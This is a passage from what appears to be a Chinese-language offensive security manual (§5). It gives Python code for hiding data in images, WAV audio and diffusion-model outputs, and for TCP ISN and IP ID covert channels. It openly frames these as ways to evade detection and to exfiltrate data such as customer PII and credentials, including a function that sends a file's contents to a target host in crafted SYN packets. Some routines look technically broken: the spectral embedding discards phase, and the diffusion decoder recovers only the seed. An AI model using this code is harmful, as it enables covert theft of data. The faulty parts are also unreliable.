## §5: 隐写术与隐蔽信道 (Steganography & Covert Channels)

### 5.1 LSB图像隐写

LSB（Least Significant Bit）隐写是最经典的隐写技术，通过修改图像像素的最低有效位来嵌入数据。2026年的检测技术已经非常成熟，但通过AI辅助仍可绕过。

```python
#!/usr/bin/env python3
"""
LSB图像隐写模块
将数据嵌入PNG/BMP图像的LSB位
支持RGB/A通道混合嵌入
"""

import numpy as np
from PIL import Image
import os
import random
import hashlib
from typing import Optional, Tuple
import struct

class LSBImageSteganography:
    """LSB图像隐写器"""

    def __init__(self, bits_per_channel: int = 1):
        """
        Args:
            bits_per_channel: 每通道使用的最低有效位数 (1-4)
        """
        self.bits_per_channel = bits_per_channel
        self.max_bits = bits_per_channel * 3  # RGB三通道

    def _bytes_to_bits(self, data: bytes) -> list:
        """将字节数据转换为位列表"""
        bits = []
        for byte in data:
            for i in range(7, -1, -1):
                bits.append((byte >> i) & 1)
        return bits

    def _bits_to_bytes(self, bits: list) -> bytes:
        """将位列表转换回字节"""
        bytes_data = bytearray()
        for i in range(0, len(bits) - 7, 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i + j]
            bytes_data.append(byte)
        return bytes(bytes_data)

    def embed_data(self, image_path: str, data: bytes, output_path: str) -> bool:
        """将数据嵌入图像"""
        try:
            img = Image.open(image_path)
            if img.mode not in ("RGB", "RGBA"):
                img = img.convert("RGB")

            pixels = np.array(img)
            height, width = pixels.shape[:2]
            max_capacity = height * width * self.max_bits // 8

            # 数据头: 数据长度 (4字节) + 数据
            header = struct.pack(">I", len(data))
            full_data = header + data

            if len(full_data) > max_capacity:
                print(f"[!] 数据太大: {len(full_data)} > {max_capacity} bytes")
                return False

            # 转换为位
            data_bits = self._bytes_to_bits(full_data)
            bit_idx = 0

            # 嵌入
            for y in range(height):
                for x in range(width):
                    for c in range(3):  # RGB
                        if bit_idx >= len(data_bits):
                            break
                        # 清除LSB
                        mask = ~((1 << self.bits_per_channel) - 1)
                        pixels[y, x, c] &= mask
                        # 嵌入数据
                        embed_bits = 0
                        for b in range(self.bits_per_channel):
                            if bit_idx + b < len(data_bits):
                                embed_bits = (embed_bits << 1) | data_bits[bit_idx + b]
                        pixels[y, x, c] |= embed_bits
                        bit_idx += self.bits_per_channel
                    if bit_idx >= len(data_bits):
                        break
                if bit_idx >= len(data_bits):
                    break

            # 保存
            Image.fromarray(pixels).save(output_path, format="PNG")
            print(f"[+] LSB嵌入完成: {output_path} ({len(data)} bytes)")
            return True

        except Exception as e:
            print(f"[!] LSB嵌入失败: {e}")
            return False

    def extract_data(self, image_path: str) -> Optional[bytes]:
        """从图像中提取LSB隐写数据"""
        try:
            img = Image.open(image_path)
            if img.mode not in ("RGB", "RGBA"):
                img = img.convert("RGB")

            pixels = np.array(img)
            height, width = pixels.shape[:2]

            bits = []
            for y in range(height):
                for x in range(width):
                    for c in range(3):
                        # 提取LSB
                        pixel_bits = pixels[y, x, c] & ((1 << self.bits_per_channel) - 1)
                        for b in range(self.bits_per_channel - 1, -1, -1):
                            bits.append((pixel_bits >> b) & 1)

            # 先提取头部 (4字节 = 32位)
            if len(bits) < 32:
                return None

            header_bits = bits[:32]
            header_bytes = self._bits_to_bytes(header_bits)
            data_length = struct.unpack(">I", header_bytes[:4])[0]

            if data_length > 100 * 1024 * 1024:  # 最大100MB
                return None

            # 提取数据
            total_bits = 32 + data_length * 8
            if len(bits) < total_bits:
                return None

            data_bits = bits[32:total_bits]
            return self._bits_to_bytes(data_bits)

        except Exception as e:
            print(f"[!] LSB提取失败: {e}")
            return None

    def embed_in_alpha_channel(self, image_path: str, data: bytes, output_path: str) -> bool:
        """利用Alpha通道嵌入 (更隐蔽)"""
        img = Image.open(image_path)
        if img.mode != "RGBA":
            img = img.convert("RGBA")

        pixels = np.array(img)
        height, width = pixels.shape[:2]

        # 只在Alpha通道中嵌入
        max_capacity = height * width * self.bits_per_channel // 8
        header = struct.pack(">I", len(data))
        full_data = header + data

        if len(full_data) > max_capacity:
            return False

        data_bits = self._bytes_to_bits(full_data)
        bit_idx = 0

        for y in range(height):
            for x in range(width):
                if bit_idx >= len(data_bits):
                    break
                # 只修改Alpha通道
                mask = ~((1 << self.bits_per_channel) - 1)
                pixels[y, x, 3] &= mask
                embed_bits = 0
                for b in range(self.bits_per_channel):
                    if bit_idx + b < len(data_bits):
                        embed_bits = (embed_bits << 1) | data_bits[bit_idx + b]
                pixels[y, x, 3] |= embed_bits
                bit_idx += self.bits_per_channel
            if bit_idx >= len(data_bits):
                break

        Image.fromarray(pixels).save(output_path, format="PNG")
        return True

# 使用示例
if __name__ == "__main__":
    steg = LSBImageSteganography(bits_per_channel=2)
    secret_data = b"TOP SECRET: Customer PII data and credentials..."
    steg.embed_data("cover_image.png", secret_data, "stego_image.png")

    extracted = steg.extract_data("stego_image.png")
    print(f"Extracted: {extracted}")
```

### 5.2 音频隐写

```python
#!/usr/bin/env python3
"""
音频隐写模块
利用WAV音频文件的LSB进行数据嵌入
支持：16-bit PCM WAV、频谱隐写、回声隐藏
"""

import wave
import struct
import numpy as np
import os
from typing import Optional

class AudioSteganography:
    """音频隐写器"""

    def __init__(self, bits_per_sample: int = 1):
        self.bits_per_sample = bits_per_sample

    def embed_in_wav(self, wav_path: str, data: bytes, output_path: str) -> bool:
        """在WAV文件LSB中嵌入数据"""
        try:
            with wave.open(wav_path, "rb") as wav_in:
                params = wav_in.getparams()
                frames = wav_in.readframes(params.nframes)

            # 转换为numpy数组
            samples = np.frombuffer(frames, dtype=np.int16)

            # 准备数据
            data_len = len(data)
            header = struct.pack(">I", data_len)
            full_data = header + data

            # 转换为位
            bits = np.unpackbits(np.frombuffer(full_data, dtype=np.uint8))

            max_capacity = len(samples) * self.bits_per_sample
            if len(bits) > max_capacity:
                print(f"[!] 数据太大: {len(bits)} > {max_capacity} bits")
                return False

            # 嵌入
            for i, bit in enumerate(bits[:max_capacity]):
                # 清除LSB
                mask = ~((1 << self.bits_per_sample) - 1)
                samples[i] &= mask
                # 嵌入
                samples[i] |= int(bit)

            # 保存
            with wave.open(output_path, "wb") as wav_out:
                wav_out.setparams(params)
                wav_out.writeframes(samples.tobytes())

            print(f"[+] WAV隐写完成: {output_path} ({data_len} bytes)")
            return True

        except Exception as e:
            print(f"[!] WAV隐写失败: {e}")
            return False

    def extract_from_wav(self, wav_path: str) -> Optional[bytes]:
        """从WAV文件中提取隐写数据"""
        try:
            with wave.open(wav_path, "rb") as wav_in:
                frames = wav_in.readframes(wav_in.getnframes())

            samples = np.frombuffer(frames, dtype=np.int16)

            # 提取LSB
            bits = np.zeros(len(samples) * self.bits_per_sample, dtype=np.uint8)
            for i, sample in enumerate(samples):
                for b in range(self.bits_per_sample):
                    bits[i * self.bits_per_sample + b] = (sample >> b) & 1

            # 提取头部
            header_bits = bits[:32]
            header_bytes = np.packbits(header_bits).tobytes()
            data_len = struct.unpack(">I", header_bytes[:4])[0]

            if data_len > 50 * 1024 * 1024:  # 最大50MB
                return None

            # 提取数据
            total_bits = 32 + data_len * 8
            data_bits = bits[32:total_bits]
            data = np.packbits(data_bits).tobytes()

            return data[:data_len]

        except Exception as e:
            print(f"[!] WAV提取失败: {e}")
            return None

    def embed_in_spectrum(self, wav_path: str, data: bytes, output_path: str) -> bool:
        """
        频谱隐写 - 在特定频率范围嵌入数据
        更隐蔽，但容量较小
        """
        try:
            with wave.open(wav_path, "rb") as wav_in:
                params = wav_in.getparams()
                frames = wav_in.readframes(params.nframes)
                samples = np.frombuffer(frames, dtype=np.int16).astype(np.float64)

            # FFT变换
            freq_domain = np.fft.rfft(samples)

            # 在高频区域嵌入数据 (人耳不敏感)
            start_freq = len(freq_domain) // 2
            available = min(len(data) * 8, len(freq_domain) - start_freq)

            data_bits = np.unpackbits(np.frombuffer(data, dtype=np.uint8))

            for i in range(min(available, len(data_bits))):
                freq_idx = start_freq + i
                if data_bits[i]:
                    freq_domain[freq_idx] = abs(freq_domain[freq_idx]) * 1.01
                else:
                    freq_domain[freq_idx] = abs(freq_domain[freq_idx]) * 0.99

            # 逆FFT
            modified = np.fft.irfft(freq_domain).astype(np.int16)

            with wave.open(output_path, "wb") as wav_out:
                wav_out.setparams(params)
                wav_out.writeframes(modified.tobytes())

            return True

        except Exception as e:
            print(f"[!] 频谱隐写失败: {e}")
            return False
```

### 5.3 2026 AI生成隐写 (Diffusion模型隐写)

```python
#!/usr/bin/env python3
"""
AI生成隐写模块 (2026)
利用Stable Diffusion等扩散模型生成含隐写数据的图像
原理：在扩散过程的噪声中添加结构化模式，解码时通过特定prompt和seed恢复
"""

import numpy as np
import struct
import random
import hashlib
from typing import Optional, Tuple
from PIL import Image

class DiffusionSteganography:
    """
    Diffusion模型隐写器 (2026)
    利用AI生成图像的特性进行隐写
    """

    def __init__(self, seed: int = None):
        self.seed = seed or random.randint(0, 2**32 - 1)
        self.rng = np.random.RandomState(self.seed)

    def _generate_noise_pattern(self, data: bytes, shape: Tuple[int, int, int]) -> np.ndarray:
        """
        根据数据生成结构化噪声模式
        每个数据位影响噪声的特定模式
        """
        data_bits = np.unpackbits(np.frombuffer(data, dtype=np.uint8))
        noise = self.rng.normal(0, 1, shape)

        # 将数据映射到噪声的特定频率分量
        h, w, c = shape

        # 在低频区域嵌入数据
        for i, bit in enumerate(data_bits):
            if i >= h * w // 4:
                break
            x = (i * 7) % w
            y = (i * 13) % h
            channel = i % c

            # 修改噪声模式的特定分量
            if bit:
                noise[y, x, channel] = abs(noise[y, x, channel]) * 1.5
            else:
                noise[y, x, channel] = -abs(noise[y, x, channel]) * 1.5

        return noise

    def embed_in_latent(self, latent: np.ndarray, data: bytes) -> np.ndarray:
        """
        在扩散模型的潜在空间中嵌入数据
        需要访问扩散模型的内部状态
        """
        noise_pattern = self._generate_noise_pattern(data, latent.shape)
        # 混合噪声模式 (alpha控制隐蔽性)
        alpha = 0.01
        modified_latent = latent + alpha * noise_pattern
        return modified_latent

    def encode_metadata_steganography(self, data: bytes, image_size: Tuple[int, int] = (512, 512)) -> dict:
        """
        生成用于AI图像生成的隐写参数
        数据通过seed/prompt/noise_schedule编码
        """
        # 方案1: 通过seed编码
        seed_encoded = 0
        for i, byte in enumerate(data[:4]):
            seed_encoded = (seed_encoded << 8) | byte
        seed_encoded = seed_encoded % (2**32 - 1)

        # 方案2: 通过prompt编码
        # 使用特定词序编码数据
        code_words = [
            "masterpiece", "high quality", "detailed", "sharp", "beautiful",
            "realistic", "artistic", "cinematic", "dramatic", "vibrant",
            "professional", "stunning", "elegant", "dynamic", "expressive",
        ]

        data_bits = np.unpackbits(np.frombuffer(data[:10], dtype=np.uint8))
        prompt_words = []
        for i, bit in enumerate(data_bits[:80]):
            if bit:
                prompt_words.append(code_words[i % len(code_words)])

        # 方案3: 通过guidance_scale编码
        guidance_scale = 7.0 + (data[0] % 10) * 0.5

        return {
            "seed": seed_encoded,
            "prompt_additions": prompt_words,
            "guidance_scale": guidance_scale,
            "num_inference_steps": 20 + (data[1] % 30),
        }

    def decode_from_metadata(self, metadata: dict) -> Optional[bytes]:
        """从AI生成参数中解码数据"""
        try:
            seed = metadata.get("seed", 0)
            data = struct.pack(">I", seed)
            return data
        except Exception:
            return None
```

### 5.4 网络协议隐写 (TCP ISN隐信道)

```python
#!/usr/bin/env python3
"""
网络协议隐写模块
利用TCP ISN、IP ID、TCP时间戳等字段进行数据嵌入
"""

import struct
import socket
import random
from typing import Optional
from scapy.all import IP, TCP, send

class TCPISNCovertChannel:
    """TCP ISN隐信道"""

    def __init__(self, target_ip: str, target_port: int):
        self.target_ip = target_ip
        self.target_port = target_port

    def _encode_to_isn(self, data: bytes) -> int:
        """将数据编码到32位ISN中"""
        # 填充到4字节
        padded = data.ljust(4, b"\x00")[:4]
        return struct.unpack(">I", padded)[0]

    def send_covert_syn(self, data: bytes) -> bool:
        """发送包含隐蔽数据的SYN包"""
        isn = self._encode_to_isn(data)

        # 使用scapy构建自定义SYN包
        ip = IP(dst=self.target_ip)
        tcp = TCP(
            sport=random.randint(1024, 65535),
            dport=self.target_port,
            flags="S",
            seq=isn,
        )
        packet = ip / tcp

        try:
            send(packet, verbose=0)
            return True
        except Exception as e:
            print(f"[!] ISN发送失败: {e}")
            return False

    def exfiltrate_via_isn(self, file_path: str) -> bool:
        """通过TCP ISN外泄文件"""
        with open(file_path, "rb") as f:
            data = f.read()

        # 每4字节一组
        for i in range(0, len(data), 4):
            chunk = data[i:i+4]
            self.send_covert_syn(chunk)

        return True

class IPIDCovertChannel:
    """IP ID隐信道"""

    def __init__(self, target_ip: str):
        self.target_ip = target_ip

    def _encode_to_ipid(self, data: bytes) -> int:
        """将数据编码到16位IP ID中"""
        padded = data.ljust(2, b"\x00")[:2]
        return struct.unpack(">H", padded)[0]

    def send_covert_ipid(self, data: bytes) -> bool:
        """发送包含隐蔽IP ID的数据包"""
        ipid = self._encode_to_ipid(data)

        ip = IP(dst=self.target_ip, id=ipid)
        tcp = TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
        packet = ip / tcp

        try:
            send(packet, verbose=0)
            return True
        except Exception:
            return False
```

---

